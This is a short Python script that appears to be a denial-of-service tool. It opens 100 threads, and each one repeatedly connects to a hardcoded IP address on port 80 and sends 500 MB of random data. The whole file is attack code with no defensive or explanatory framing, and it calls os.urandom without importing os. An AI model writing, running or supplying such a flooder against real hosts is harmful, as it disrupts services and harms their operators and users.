import socket
import threading

target_IP = "47.246.165.73"
target_port = 80
payload_size = 500 * 1024 * 1024 # 500 MB
Trd = 100

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_IP, target_port))
        s.send(os.urandom(payload_size))
        s.close()

for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()
